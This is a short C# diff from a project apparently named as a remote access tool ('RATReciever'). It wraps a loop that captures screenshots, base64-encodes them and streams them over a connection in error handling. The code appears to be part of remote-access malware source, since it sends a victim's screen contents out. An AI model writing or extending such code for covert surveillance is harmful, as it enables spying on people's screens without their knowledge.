@@ -153,11 +153,16 @@ namespace RATReciever
         {
             while (rdp)
             {
-                byte[] ImageBytes = Generics.Imaging.ImageToByte(Generics.Imaging.Get_ScreenShot_In_Bitmap());
-                string StreamData = "REMOTEDATA|***|" + Convert.ToBase64String(ImageBytes);
-                SW.WriteLine(StreamData);
-                SW.Flush();
-                Thread.Sleep(1);
+                try
+                {
+                    byte[] ImageBytes = Generics.Imaging.ImageToByte(Generics.Imaging.Get_ScreenShot_In_Bitmap());
+                    string StreamData = "REMOTEDATA|***|" + Convert.ToBase64String(ImageBytes);
+                    SW.WriteLine(StreamData);
+                    SW.Flush();
+                    Thread.Sleep(1);
+                }
+
+                catch { rdp = false; }
             }
         }
     }
